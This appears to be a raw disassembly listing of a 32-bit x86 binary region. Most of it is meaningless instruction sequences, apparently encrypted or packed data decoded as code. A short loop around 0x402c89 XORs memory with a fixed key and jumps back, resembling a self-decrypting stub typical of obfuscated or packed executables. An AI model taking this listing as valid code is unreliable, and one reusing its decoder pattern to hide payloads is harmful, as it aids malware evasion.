  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	nop
  4028e1:	push   ss
  4028e2:	neg    BYTE PTR [eax+0x7e7e03e6]
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	and    ch,BYTE PTR [eax+edi*4-0x4810455d]
  4028f3:	mov    dl,cl
  4028f5:	rcr    BYTE PTR [edx-0x36],0xff
  4028f9:	adc    eax,0x4590f1b2
  4028fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ff:	sub    ebp,eax
  402901:	add    eax,0xfbcb0f12
  402906:	mov    ebp,0x8762e547
  40290b:	outs   dx,BYTE PTR ds:[esi]
  40290c:	and    eax,0x4ac62813
  402911:	cld    
  402912:	jl     0x402909
  402914:	out    dx,eax
  402915:	dec    esi
  402916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402917:	shl    BYTE PTR [eax-0xde57cdd],cl
  40291d:	sbb    BYTE PTR [ecx-0x426c8085],ah
  402923:	pop    ebp
  402924:	loope  0x4028f7
  402926:	fsubr  st,st(3)
  402928:	and    eax,0x456866ac
  40292d:	enter  0x5c6a,0x4e
  402931:	add    al,0x1b
  402933:	jmp    0x1ca39e57
  402938:	loope  0x40291e
  40293a:	mov    al,0xf
  40293c:	(bad)  
  40293d:	les    edx,FWORD PTR [edx-0x127263c9]
  402943:	adc    eax,0x64e7e503
  402948:	pop    ecx
  402949:	pop    es
  40294a:	pop    edi
  40294b:	sbb    ecx,ecx
  40294d:	sbb    DWORD PTR [esi],ebx
  40294f:	mov    ?,WORD PTR [ecx]
  402951:	xor    al,0xc0
  402953:	xor    eax,esi
  402955:	cmc    
  402956:	mov    ds:0xf83ad5df,eax
  40295b:	cwde   
  40295c:	sti    
  40295d:	xchg   ah,al
  40295f:	stos   BYTE PTR es:[edi],al
  402960:	and    DWORD PTR [edx+0x4e5c3d1b],esp
  402966:	add    al,0xac
  402968:	dec    esp
  402969:	int3   
  40296a:	pop    eax
  40296b:	stc    
  40296c:	or     al,0x18
  40296e:	sub    BYTE PTR [esi-0x2b7b0a6e],cl
  402974:	adc    eax,0x1deea493
  402979:	mov    DWORD PTR [ebx+0x5478e97e],0xc6b5f32c
  402983:	jmp    0x38f8:0x5bb3c13e
  40298a:	sbb    ebp,ecx
  40298c:	mov    ebx,0x3211ee9a
  402991:	int3   
  402992:	mov    bl,0xf0
  402994:	mov    bl,BYTE PTR [ebx-0x4229a837]
  40299a:	popa   
  40299b:	bound  esp,QWORD PTR [esi]
  40299d:	adc    al,0x7b
  40299f:	sbb    bh,BYTE PTR [ebp+0x2]
  4029a2:	sahf   
  4029a3:	in     al,dx
  4029a4:	test   DWORD PTR ds:0xf5d427f,edi
  4029aa:	dec    eax
  4029ab:	arpl   WORD PTR [ebx-0x4f],sp
  4029ae:	xor    ebx,ebx
  4029b0:	jecxz  0x402a31
  4029b2:	sbb    DWORD PTR [edi+0x4638e0f4],ecx
  4029b8:	sub    bh,bh
  4029ba:	popa   
  4029bb:	imul   ebp,DWORD PTR [esi+0x33ec1e7f],0x4fbaada2
  4029c5:	mov    al,ds:0x21753a83
  4029ca:	aaa    
  4029cb:	daa    
  4029cc:	push   ebx
  4029cd:	sub    eax,0x4badbc24
  4029d2:	fwait
  4029d3:	int    0x37
  4029d5:	cli    
  4029d6:	jp     0x402a13
  4029d8:	xchg   eax,edx
  4029da:	pop    ebp
  4029db:	jmp    0xacad9cb7
  4029e0:	test   BYTE PTR [ecx+0x6c],bh
  4029e3:	add    eax,0x5cfb4f21
  4029e8:	bound  edi,QWORD PTR [eax]
  4029ea:	jb     0x4029d4
  4029ec:	repz dec eax
  4029ee:	retf   0x795f
  4029f1:	mul    BYTE PTR [edx]
  4029f3:	xlat   BYTE PTR ds:[ebx]
  4029f4:	cmp    esi,DWORD PTR ds:0xa320901d
  4029fa:	lea    ecx,[edx+0x1a]
  4029fd:	pop    esp
  4029fe:	leave  
  4029ff:	cli    
  402a00:	mov    WORD PTR [ebp-0x5d0e9ecf],gs
  402a06:	rcr    DWORD PTR [esi],0x14
  402a09:	rol    DWORD PTR [eax+0x12],cl
  402a0c:	stos   BYTE PTR es:[edi],al
  402a0d:	or     al,0x19
  402a0f:	or     ecx,DWORD PTR [ecx]
  402a11:	aam    0x14
  402a13:	fisttp WORD PTR [eax-0x2a0101f2]
  402a19:	mov    dl,0xa2
  402a1b:	popf   
  402a1c:	xchg   edx,eax
  402a1d:	test   eax,0xbf500f6a
  402a22:	out    0x1d,eax
  402a24:	cli    
  402a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a26:	push   edi
  402a27:	xor    DWORD PTR [esp],esi
  402a2a:	lods   eax,DWORD PTR ds:[esi]
  402a2b:	mov    esp,0x2e64312b
  402a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a31:	aad    0x47
  402a33:	and    dl,bh
  402a35:	lods   eax,DWORD PTR ds:[esi]
  402a36:	shl    BYTE PTR [ecx+ecx*1+0x2cfcb45e],0x7c
  402a3e:	add    BYTE PTR [eax-0x44],0x40
  402a42:	inc    edi
  402a43:	xor    eax,0x18bb04d8
  402a48:	or     ah,BYTE PTR [ebx]
  402a4a:	sbb    eax,DWORD PTR [ebx-0xe9fe113]
  402a50:	pushf  
  402a51:	or     al,0x28
  402a53:	js     0x402a77
  402a55:	cs mov ebp,0xa4536ae9
  402a5b:	(bad)  [ebx+0x26]
  402a5e:	lods   al,BYTE PTR ds:[esi]
  402a5f:	(bad)  
  402a60:	nop
  402a61:	int    0x3a
  402a63:	imul   edi,DWORD PTR [ebx+0xfb8378f],0x10
  402a6a:	dec    edx
  402a6b:	sub    BYTE PTR [ebp-0x8],dl
  402a6e:	mov    ebp,0x2d6e0421
  402a73:	add    bl,BYTE PTR [ebx+0x7ec5347e]
  402a79:	les    esp,FWORD PTR [edx]
  402a7b:	pusha  
  402a7c:	sti    
  402a7d:	add    BYTE PTR [ebx],bl
  402a7f:	adc    BYTE PTR [edx],al
  402a81:	dec    ebp
  402a82:	add    edi,DWORD PTR [ecx]
  402a84:	ret    
  402a85:	stc    
  402a86:	iret   
  402a87:	clc    
  402a88:	and    al,0xd4
  402a8a:	adc    BYTE PTR [esi-0x31],cl
  402a8d:	repnz push ss
  402a8f:	cmc    
  402a90:	sbb    DWORD PTR [ecx+0x366d1ac6],edi
  402a96:	cmc    
  402a97:	fcmove st,st(4)
  402a99:	push   es
  402a9a:	les    edx,FWORD PTR [edi-0x21]
  402a9d:	and    DWORD PTR [edx+eiz*8-0x498c9d57],ecx
  402aa4:	retf   
  402aa5:	stos   BYTE PTR es:[edi],al
  402aa6:	cdq    
  402aa7:	push   esi
  402aa8:	es call 0xaba38ba0
  402aae:	jne    0x402a48
  402ab0:	test   al,0xff
  402ab2:	and    ah,BYTE PTR [ebp-0x4121fd6c]
  402ab8:	push   esi
  402ab9:	add    eax,0x94c98112
  402abe:	cdq    
  402abf:	fbld   TBYTE PTR [eax]
  402ac1:	xchg   ebp,eax
  402ac2:	mov    fs,WORD PTR [esi-0x73]
  402ac5:	mov    dl,0xa3
  402ac7:	cwde   
  402ac8:	push   ecx
  402ac9:	in     al,0x51
  402acb:	or     DWORD PTR [ebx+0x4f],0x8103d5e6
  402ad2:	pop    es
  402ad3:	ja     0x402a7e
  402ad5:	cdq    
  402ad6:	jbe    0x402ae5
  402ad8:	push   0xffffffb4
  402ada:	int    0xac
  402adc:	xchg   edx,eax
  402add:	les    esp,FWORD PTR [ebp-0x1c]
  402ae0:	leave  
  402ae1:	mov    cl,0xdb
  402ae3:	adc    bl,BYTE PTR [edi-0x4]
  402ae6:	dec    edi
  402ae7:	mov    al,ds:0x27d3272f
  402aec:	out    dx,al
  402aed:	pop    ebp
  402aee:	mov    esi,0x34b8c513
  402af3:	or     bh,al
  402af5:	(bad)  
  402af6:	push   edi
  402af7:	mov    ch,0x90
  402af9:	push   edx
  402afa:	mov    edx,0xaef9622b
  402aff:	xchg   edi,eax
  402b00:	test   al,0x24
  402b02:	mov    eax,0x842fc549
  402b07:	popf   
  402b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b09:	shl    DWORD PTR [ecx+esi*8],1
  402b0c:	cmp    BYTE PTR [eax],ch
  402b0e:	mov    eax,0xc9f4cb4
  402b13:	ds push ebp
  402b15:	push   edx
  402b16:	dec    eax
  402b17:	out    dx,al
  402b18:	push   ss
  402b19:	inc    edx
  402b1a:	cwde   
  402b1b:	mov    edx,0x3913df57
  402b20:	dec    eax
  402b21:	nop
  402b22:	retf   
  402b23:	push   esi
  402b24:	cmp    esi,DWORD PTR [edi]
  402b26:	cdq    
  402b27:	push   eax
  402b28:	mul    BYTE PTR [ebp-0x4f66e897]
  402b2e:	clc    
  402b2f:	fld    DWORD PTR [ebp-0x400eaab4]
  402b35:	xchg   esi,eax
  402b36:	shl    dl,cl
  402b38:	mov    esi,0x6faf5160
  402b3d:	addr16 sub al,0x1c
  402b40:	cs jge 0x402ba0
  402b43:	pushw  0x9f9b
  402b47:	inc    ebp
  402b48:	or     BYTE PTR [ebx-0x4],al
  402b4b:	fistp  DWORD PTR [edi+0x59]
  402b4e:	(bad)
  402b52:	mov    bh,0x95
  402b54:	fwait
  402b55:	sbb    esi,ebx
  402b57:	stos   BYTE PTR es:[edi],al
  402b58:	lock jb 0x402b9d
  402b5b:	add    eax,0xa864862a
  402b60:	xchg   esp,eax
  402b61:	mov    ah,0xde
  402b63:	sub    DWORD PTR [eax-0x2e],ebx
  402b66:	cdq    
  402b67:	mov    esp,0x2aa351f9
  402b6c:	or     bl,BYTE PTR [ecx]
  402b6e:	xor    DWORD PTR [edi+ebx*8-0xd],0x77b6f5a8
  402b76:	inc    ebp
  402b77:	fcom   DWORD PTR [ebx-0x46ea048b]
  402b7d:	xor    DWORD PTR [eax-0x22],esi
  402b80:	pop    eax
  402b81:	iret   
  402b82:	push   0xfffffffd
  402b84:	cli    
  402b85:	pop    ds
  402b86:	xor    al,0x79
  402b88:	mov    ecx,0x78e96631
  402b8d:	pop    eax
  402b8e:	push   ebp
  402b8f:	retf   0x3ed
  402b92:	sbb    al,0xe4
  402b94:	iret   
  402b95:	jg     0x402b2b
  402b97:	mov    cl,0x76
  402b99:	or     al,0x5c
  402b9b:	out    0x41,al
  402b9d:	xchg   esi,eax
  402b9e:	mov    ebp,0x2726fcd8
  402ba3:	xor    eax,0xe8e79e3d
  402ba8:	pop    ebx
  402ba9:	mov    dl,0xab
  402bab:	outs   dx,DWORD PTR ds:[esi]
  402bac:	std    
  402bad:	(bad)  
  402baf:	inc    ebp
  402bb0:	pushf  
  402bb1:	clc    
  402bb2:	or     DWORD PTR [ebp+0x5f],0xffffffa5
  402bb6:	test   eax,0x556674b
  402bbb:	and    DWORD PTR [ecx-0x506465b0],ecx
  402bc1:	pop    ss
  402bc2:	stos   DWORD PTR es:[edi],eax
  402bc3:	pop    ss
  402bc4:	aam    0x27
  402bc6:	cmp    al,0x6c
  402bc8:	out    dx,eax
  402bc9:	sar    DWORD PTR [esi-0x46],cl
  402bcc:	jge    0x402bac
  402bce:	call   0x46c28f75
  402bd3:	(bad)  
  402bd4:	out    0x50,al
  402bd6:	call   0x5d69:0x7b3a47a6
  402bdd:	or     eax,edi
  402bdf:	xlat   BYTE PTR ds:[ebx]
  402be0:	pop    eax
  402be1:	into   
  402be2:	pop    esp
  402be3:	push   cs
  402be4:	icebp  
  402be5:	pop    es
  402be6:	mov    BYTE PTR [ebx],bh
  402be8:	cmp    BYTE PTR [ecx+0x69],bl
  402beb:	add    eax,DWORD PTR [ecx+eax*1+0x4d]
  402bef:	lock paddusw mm2,QWORD PTR [eax]
  402bf3:	jmp    0x9d62f925
  402bf8:	push   es
  402bf9:	push   ecx
  402bfa:	sub    edx,DWORD PTR [ebx]
  402bfc:	xlat   BYTE PTR ds:[ebx]
  402bfd:	das    
  402bfe:	fiadd  DWORD PTR [ebx-0x20]
  402c01:	popa   
  402c02:	jl     0x402b96
  402c04:	sub    bh,BYTE PTR [ebp+0x2a]
  402c07:	aad    0x53
  402c09:	rcr    BYTE PTR [edi+edi*2-0xf0a40ec],1
  402c10:	xor    ecx,eax
  402c12:	sub    BYTE PTR [esi+0x4c100035],ah
  402c18:	mov    eax,ds:0xe4842ed4
  402c1d:	jmp    0xa1e06992
  402c22:	add    eax,0xfae69484
  402c27:	mov    eax,ds:0x384d856e
  402c2c:	test   eax,0x745915e3
  402c31:	jle    0x402c15
  402c33:	es test al,0x52
  402c36:	(bad)  
  402c37:	mov    dl,0x6f
  402c39:	lahf   
  402c3a:	scas   eax,DWORD PTR es:[edi]
  402c3b:	loope  0x402bf8
  402c3d:	xchg   BYTE PTR [ebp+eiz*8+0x56],cl
  402c41:	mov    ebx,0xeccbb31d
  402c46:	int3   
  402c47:	stc    
  402c48:	fst    QWORD PTR [ebx-0x43]
  402c4b:	repz jo 0x402c6c
  402c4e:	push   cs
  402c4f:	fsub   st(1),st
  402c51:	cld    
  402c52:	out    dx,al
  402c53:	mov    dh,0x32
  402c55:	test   DWORD PTR [eax],edx
  402c57:	(bad)  
  402c58:	pop    edi
  402c59:	jecxz  0x402bf2
  402c5b:	xchg   cl,dh
  402c5d:	sbb    DWORD PTR [ebx-0x6266c0fa],eax
  402c63:	pop    edx
  402c64:	pushf  
  402c65:	mov    eax,ds:0x3556a885
  402c6a:	(bad)  
  402c6b:	cmc    
  402c6c:	xor    eax,0x8c7a592d
  402c71:	mov    dl,0xe5
  402c73:	add    BYTE PTR [ecx],dh
  402c75:	sbb    esp,DWORD PTR [esi+0x53ec4f16]
  402c7b:	or     esi,ebp
  402c7d:	push   DWORD PTR [edx-0xfba74c5]
  402c83:	and    DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	(bad)  
  402cc1:	ret    0xdf68
  402cc4:	or     al,BYTE PTR [edi]
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	mov    ecx,DWORD PTR [esp+eax*2-0x44a40195]
  402cd3:	test   BYTE PTR [esi+eax*1],ch
  402cd6:	jbe    0x402cf9
  402cd8:	xor    DWORD PTR [ebx+0x86215d6],edx
  402cde:	pop    esi
  402cdf:	sub    esi,ebx
  402ce1:	jb     0x402cc9
  402ce3:	or     BYTE PTR [eax-0x2a8ba1da],0x76
  402cea:	cmp    ah,BYTE PTR [esi+0x6db2fd94]
  402cf0:	mov    ecx,0xe1160521
  402cf5:	stos   BYTE PTR es:[edi],al
  402cf6:	shr    bh,0x10
  402cf9:	(bad)  
  402cfa:	(bad)
  402cfd:	pop    esi
  402cfe:	mov    bh,0x9b
  402d00:	popf   
  402d01:	xchg   esp,eax
  402d02:	push   ebx
  402d03:	aam    0xe4
  402d05:	arpl   WORD PTR [eax-0x72],bx
  402d08:	loopne 0x402cf0
  402d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d0b:	sbb    bh,BYTE PTR [eax-0x8]
  402d0e:	cdq    
  402d0f:	dec    ebp
  402d10:	mov    ecx,0xc3e11311
  402d15:	push   edi
  402d16:	call   FWORD PTR [ebx-0x7ae78c86]
  402d1c:	ror    DWORD PTR [ebp+0x59],cl
  402d1f:	jmp    0x84bbaf42
  402d24:	jmp    DWORD PTR [edi]
  402d26:	xlat   BYTE PTR ds:[ebx]
  402d27:	inc    ebp
  402d28:	adc    bl,BYTE PTR [ecx+0x56f85d28]
  402d2e:	jge    0x402d47
  402d30:	xchg   esi,eax
  402d31:	pop    es
  402d32:	jbe    0x402d66
  402d34:	loope  0x402d34
  402d36:	mov    dl,0xb1
  402d38:	pop    edi
  402d39:	mov    esp,eax
  402d3b:	jge    0x402ccd
  402d3d:	or     al,0xc
  402d3f:	jecxz  0x402d39
  402d41:	push   esi
  402d42:	mov    ch,0xf9
  402d44:	mov    esp,0x2e10ecc0
  402d49:	pop    ss
  402d4a:	cs scas eax,DWORD PTR es:[edi]
  402d4c:	mov    ds:0x329cdbf0,al
  402d51:	out    0x89,al
  402d53:	test   DWORD PTR [esi],edi
  402d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d56:	repnz cmp eax,0x284d7b
  402d5c:	push   ss
  402d5d:	sub    DWORD PTR [ecx-0xc],esi
  402d60:	xchg   ebp,ecx
  402d62:	dec    ecx
  402d63:	jp     0x402daf
  402d65:	imul   edi,DWORD PTR [ecx],0xffffffa4
  402d68:	das    
  402d69:	pop    ecx
  402d6a:	jo     0x402cef
  402d6c:	xor    BYTE PTR [ecx],0x74
  402d6f:	gs out dx,al
  402d71:	iret   
  402d72:	pop    eax
  402d73:	jmp    0xf9df:0xa7330163
  402d7a:	(bad)  
  402d7b:	sub    eax,0x2820a63d
  402d80:	xchg   DWORD PTR ds:0x3b414e6f,esp
  402d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d87:	ss stc 
  402d89:	xor    DWORD PTR ds:0x5f4f303f,esp
  402d8f:	or     al,0x3c
  402d91:	dec    ebx
  402d92:	mov    ebp,0xc16b8bfa
  402d97:	(bad)  
  402d98:	icebp  
  402d99:	sbb    DWORD PTR [edx-0x13],0xffffffff
  402d9d:	stc    
  402d9e:	xchg   esp,eax
  402d9f:	cmp    bh,BYTE PTR [eax+ebp*2+0x6d]
  402da3:	sahf   
  402da4:	push   esp
  402da5:	leave  
  402da6:	(bad)  
  402da7:	jecxz  0x402dfd
  402da9:	imul   ecx,esp,0x4c0ae842
  402daf:	sub    al,0x68
  402db1:	sar    ecx,0xab
  402db4:	mov    bl,BYTE PTR [esi]
  402db6:	arpl   WORD PTR [ecx-0x5bdeff5],si
  402dbc:	mov    eax,0x64ab16a4
  402dc1:	ja     0x402df6
  402dc3:	in     eax,0x17
  402dc5:	cwde   
  402dc6:	pushf  
  402dc7:	push   ebx
  402dc8:	jle    0x402e11
  402dca:	pop    ecx
  402dcb:	xchg   DWORD PTR [edi-0x52339b6e],esi
  402dd1:	mov    al,0x91
  402dd3:	and    eax,0x57e2c41b
  402dd8:	test   BYTE PTR [eax-0x46ae86d3],0xb8
  402ddf:	xchg   DWORD PTR [edi],eax
  402de1:	sbb    eax,0xc624ada
  402de6:	push   es
  402de7:	sbb    cl,BYTE PTR ds:0x904cc21f
  402ded:	rcl    DWORD PTR [eax+ebx*2-0x647a01af],0x1d
  402df5:	add    edi,DWORD PTR [edx-0x1d]
  402df8:	neg    BYTE PTR [edi-0x142e5ee1]
  402dfe:	es clc 
  402e00:	add    BYTE PTR [esi-0x47],bl
  402e03:	push   ss
  402e04:	mov    ebx,0x76009499
  402e09:	adc    cl,BYTE PTR [ebx+0x1a]
  402e0c:	push   edi
  402e0d:	mov    dh,0xf8
  402e0f:	sub    al,0x94
  402e11:	push   eax
  402e12:	inc    edx
  402e13:	enter  0x996c,0x4d
  402e17:	add    ch,BYTE PTR [eax]
  402e19:	lods   eax,DWORD PTR ds:[esi]
  402e1a:	push   edi
  402e1b:	test   DWORD PTR [ebp+0x12cc6dfb],ebp
  402e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e22:	push   ecx
  402e23:	xchg   esi,eax
  402e24:	xor    ebx,DWORD PTR [ebp+eiz*1+0x478773ff]
  402e2b:	paddsw mm7,QWORD PTR [ecx]
  402e2e:	into   
  402e2f:	jl     0x402de8
  402e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e32:	sbb    esp,0xffffff92
  402e35:	fadd   DWORD PTR ds:0xe582ca20
  402e3b:	fimul  WORD PTR [ebp-0x60c81117]
  402e41:	mov    edx,fs
  402e43:	outs   dx,DWORD PTR ds:[esi]
  402e44:	fbld   TBYTE PTR [ecx]
  402e46:	sub    BYTE PTR [ebx],0xd
  402e49:	pop    esi
  402e4a:	rol    BYTE PTR [ecx+ebp*8-0x724b45fb],cl
  402e51:	adc    eax,0x24681762
  402e56:	inc    ebp
  402e57:	es stc 
  402e59:	or     cl,ah
  402e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5c:	mov    ecx,gs
  402e5e:	push   0xffffffcd
  402e60:	ja     0x402e86
  402e62:	adc    ebp,eax
  402e64:	add    DWORD PTR [edi-0x7d53dd34],esp
  402e6a:	pop    esp
  402e6b:	xchg   DWORD PTR [eax],eax
  402e6d:	sub    edx,ebx
  402e6f:	(bad)  [esi+0x5664cfe]
  402e75:	cmp    eax,0x8316bf2a
  402e7a:	xchg   DWORD PTR [esi+0x2738aa0f],edi
  402e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e81:	call   0xb5e4:0x9b8fd7c0
  402e88:	sbb    BYTE PTR [ecx-0x400de73c],dl
  402e8e:	adc    ax,0x850a
  402e92:	pushf  
  402e93:	cwde   
  402e94:	lds    ecx,FWORD PTR [eax-0x7774c3dd]
  402e9a:	enter  0x3be9,0x90
  402e9e:	call   0x442d084
  402ea3:	xor    BYTE PTR ds:0x7d0889d3,bh
  402ea9:	ror    dh,1
  402eab:	out    dx,al
  402eac:	inc    ecx
  402ead:	xor    BYTE PTR [ecx+0x4ede1bab],ch
  402eb3:	retf   
  402eb4:	mov    bh,0x97
  402eb6:	(bad)  
  402eb8:	shr    BYTE PTR [esi-0x6f],1
  402ebb:	inc    edx
  402ebc:	std    
  402ebd:	pop    ebx
  402ebe:	lods   eax,DWORD PTR ds:[esi]
  402ebf:	cld    
  402ec0:	push   esi
  402ec1:	jns    0x402f15
  402ec3:	sbb    ah,BYTE PTR [edx+0x38]
  402ec6:	push   esi
  402ec7:	aad    0xe0
  402ec9:	xor    dh,BYTE PTR [edi]
  402ecb:	jecxz  0x402ee6
  402ecd:	out    dx,eax
  402ece:	mov    edx,0xf1af4a08
  402ed3:	dec    edi
  402ed4:	shl    ah,0xce
  402ed7:	sub    esi,DWORD PTR [ebp-0x681a5ad3]
  402edd:	inc    eax
  402ede:	dec    edi
  402edf:	mov    ds:0xe0ac4210,al
  402ee4:	aaa    
  402ee5:	sub    esi,DWORD PTR [esi-0x39]
  402ee8:	mov    ds,WORD PTR [esi-0x7a]
  402eeb:	pop    eax
  402eec:	sbb    eax,0x7b94c933
  402ef1:	inc    ebx
  402ef2:	push   eax
  402ef3:	push   ebp
  402ef4:	push   edi
  402ef5:	pushf  
  402ef6:	icebp  
  402ef7:	call   0x4c457a56
  402efc:	pop    ss
  402efd:	imul   ebp,DWORD PTR [ebp+ecx*2+0x112fcc82],0xffffffe3
  402f05:	lahf   
  402f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f07:	je     0x402e91
  402f09:	in     al,dx
  402f0a:	fistp  QWORD PTR [esi-0x5f48ced3]
  402f10:	shl    DWORD PTR [eax],1
  402f12:	jnp    0x402f0b
  402f14:	fmulp  st(7),st
  402f16:	hlt    
  402f17:	push   edx
  402f18:	and    BYTE PTR [eax+0x1d],bl
  402f1b:	data16 jle 0x402ea2
  402f1e:	dec    edx
  402f1f:	mov    fs,WORD PTR [ebx+0x49]
  402f22:	add    ch,BYTE PTR ds:0x40400723
  402f28:	inc    eax
  402f29:	into   
  402f2a:	sbb    eax,0x20bebe6
  402f2f:	rol    bh,0x31
  402f32:	inc    esi
  402f33:	and    al,0x35
  402f35:	jnp    0x402f99
  402f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f38:	es mov ebp,0x2062a15f
  402f3e:	(bad)  [edx+0x364c0ee6]
  402f44:	cmp    BYTE PTR [edi-0x6b],al
  402f47:	or     bl,BYTE PTR [ebx+0x3ee83a3]
  402f4d:	jae    0x402f15
  402f4f:	addr16 in eax,0x1d
  402f52:	mov    WORD PTR [edi],gs
  402f54:	repz xchg eax,eax
  402f57:	scas   eax,DWORD PTR es:[edi]
  402f58:	xor    eax,0x814052c1
  402f5d:	sub    ecx,DWORD PTR [esi-0x2fadd984]
  402f63:	rol    DWORD PTR [ebp+edi*8+0x767bdd9f],cl
  402f6a:	xchg   BYTE PTR [ebx-0x8],bl
  402f6d:	(bad)  
  402f6e:	fistp  DWORD PTR [ebx]
  402f70:	outs   dx,BYTE PTR ds:[esi]
  402f71:	xchg   ebp,eax
  402f72:	adc    esp,DWORD PTR [ecx-0x4b]
  402f75:	jne    0x402fe5
  402f77:	in     eax,0x1c
  402f79:	cld    
  402f7a:	cmp    edx,ebx
  402f7c:	sub    edx,DWORD PTR gs:0xd9046b1d
  402f83:	outs   dx,DWORD PTR ds:[esi]
  402f84:	inc    esp
  402f85:	call   0xc64ea727
  402f8a:	sbb    BYTE PTR ds:0x47ca28d3,ah
  402f90:	ror    BYTE PTR [edi-0x7f3ba013],0x4a
  402f97:	repnz mov ebp,DWORD PTR [edi]
  402f9a:	cdq    
  402f9b:	rcl    DWORD PTR [eax],cl
  402f9d:	lea    esp,[esi+0x55bbec6c]
  402fa3:	cmp    ch,BYTE PTR [edx]
  402fa5:	pop    es
  402fa6:	or     ebp,ebp
  402fa8:	jl     0x40300c
  402faa:	adc    esp,DWORD PTR [esi-0x2c7a2a72]
  402fb0:	mov    cl,0xd
  402fb2:	les    esi,FWORD PTR [edi+0x71976992]
  402fb8:	inc    edi
  402fb9:	repz ret 0x2100
  402fbd:	dec    edx
  402fbe:	adc    eax,0x7e3699fc
  402fc3:	pop    edx
  402fc4:	data16 (bad) 
  402fc7:	or     DWORD PTR [edi],eax
  402fc9:	ror    al,1
  402fcb:	adc    al,0xe9
  402fcd:	cmp    esi,ebx
  402fcf:	xchg   DWORD PTR [ebx],ecx
  402fd1:	jbe    0x402fdb
  402fd3:	repnz add BYTE PTR [edi+0x63],0xb0
  402fd8:	pop    ecx
  402fd9:	cwde   
  402fda:	jb     0x403052
  402fdc:	int3   
  402fdd:	jg     0x403050
  402fdf:	dec    esi
  402fe0:	ins    BYTE PTR es:[edi],dx
  402fe1:	mov    ds:0x388b9e9,al
  402fe6:	jl     0x402ffd
  402fe8:	sahf   
  402fe9:	push   es
  402fea:	icebp  
  402feb:	sub    BYTE PTR [edi],bh
  402fed:	stos   DWORD PTR es:[edi],eax
  402fee:	mov    ecx,0xccdf0709
  402ff3:	loope  0x402fcb
  402ff5:	rcl    DWORD PTR [esi],0x29
  402ff8:	out    0xf7,al
  402ffa:	inc    edi
  402ffb:	inc    eax
  402ffc:	sub    BYTE PTR [esi+ebx*8-0x6c],ah
  403000:	push   cs
  403001:	in     eax,0xbb
  403003:	mov    fs,WORD PTR [eax+0x5b]
  403006:	les    ebx,FWORD PTR [eax-0x11e8c858]
  40300c:	in     al,dx
  40300d:	cs std 
  40300f:	outs   dx,BYTE PTR ds:[esi]
  403010:	mov    ebp,0x78c5e726
  403015:	mov    ds:0xa1884c03,al
  40301a:	test   al,0xfb
  40301c:	ds repz adc al,0x2b
  403020:	xchg   BYTE PTR [ebx-0x20],ah
  403023:	jb     0x40302c
  403025:	jb     0x40305e
  403027:	pop    ds
  403028:	xor    dl,BYTE PTR [ebp+0x7c7c27f5]
  40302e:	loop   0x40302e
  403030:	cmp    eax,0x5caa8f42
  403035:	mov    ds:0x16752208,eax
  40303a:	mov    cs,WORD PTR [ebp+0x38]
  40303d:	ss std 
  40303f:	pop    ecx
  403040:	or     al,BYTE PTR [eax+0x17]
  403043:	push   0xffffff9e
  403045:	inc    ebx
  403046:	mov    DWORD PTR [edx-0x222ff327],eax
  40304c:	cmp    BYTE PTR ds:0x65c03ad1,dh
  403052:	(bad)  
  403053:	aaa    
  403054:	mov    ss,edx
  403056:	out    dx,al
  403057:	add    DWORD PTR [esi+edx*1],edi
  40305a:	fdivr  QWORD PTR [edi]
  40305c:	inc    esp
  40305d:	or     ah,BYTE PTR [esi]
  40305f:	mov    dh,0x66
  403061:	mov    eax,DWORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fstp   TBYTE PTR [esi+edx*1+0xd]
  403078:	sub    eax,0x7e7e1a9e
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	push   ebp
  403082:	jno    0x4030ef
  403084:	mov    ch,BYTE PTR [edi-0xfcc50c0]
  40308a:	stos   BYTE PTR es:[edi],al
  40308b:	xchg   esi,eax
  40308c:	gs pop esp
  40308e:	jns    0x403086
  403090:	inc    edx
  403091:	js     0x4030ec
  403093:	dec    ecx
  403094:	ret    
  403095:	xchg   DWORD PTR [edi],ebx
  403097:	not    BYTE PTR [edx+0x667ab4af]
  40309d:	mov    ch,0xb5
  40309f:	xchg   ebp,eax
  4030a0:	pop    es
  4030a1:	sbb    edi,DWORD PTR ds:0x73468e9c
  4030a7:	int3   
  4030a8:	sbb    ecx,ecx
  4030aa:	je     0x4030ed
  4030ac:	inc    edi
  4030ad:	or     DWORD PTR [ecx+0x7e67908e],ebx
  4030b3:	in     eax,dx
  4030b4:	ins    DWORD PTR es:[edi],dx
  4030b5:	jge    0x40307c
